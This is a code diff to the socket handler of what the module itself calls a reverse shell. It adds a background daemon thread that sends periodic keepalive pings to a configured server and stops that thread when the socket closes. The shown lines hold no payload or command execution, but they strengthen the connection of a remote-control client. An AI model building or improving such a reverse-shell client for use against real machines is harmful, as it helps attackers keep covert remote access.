@@ -5,10 +5,11 @@ This module contains the socket handler for the reverse shell.
 # 1st party imports
 import time
 import socket
+import threading
 from typing import Optional
 
 # local imports
-from config import SERVER_URL, SERVER_PORT
+from config import SERVER_URL, SERVER_PORT, PING_INTERVAL, PING_MESSAGE
 
 
 class SocketHandler:
@@ -26,6 +27,14 @@ class SocketHandler:
 
         # connect to the server
         self.connect_to_server()
+
+        # start a background ping thread to keep the connection alive
+        self._stop_ping = threading.Event()
+        self._ping_thread = threading.Thread(
+            target=self._ping_loop,
+            daemon=True,
+        )
+        self._ping_thread.start()
 
     @property
     def is_connected(self) -> bool:
@@ -121,12 +130,31 @@ class SocketHandler:
         except Exception:
             pass
 
+    def _ping_loop(self):
+        """Send a small ping to the server at regular intervals
+        to prevent stale TCP connections. Runs in a daemon thread and
+        does **not** block main execution.
+        """
+
+        while not self._stop_ping.is_set():
+            time.sleep(PING_INTERVAL)
+
+            # only ping if still connected
+            if self.is_connected:
+                try:
+                    self.socket.sendall(PING_MESSAGE)
+                except Exception:
+                    pass
+
     def close(self):
         """
         This function closes the socket.
         """
 
         try:
+            # stop ping thread
+            if hasattr(self, "_stop_ping"):
+                self._stop_ping.set()
             self.__connected = False
             self.socket.close()
         except Exception:
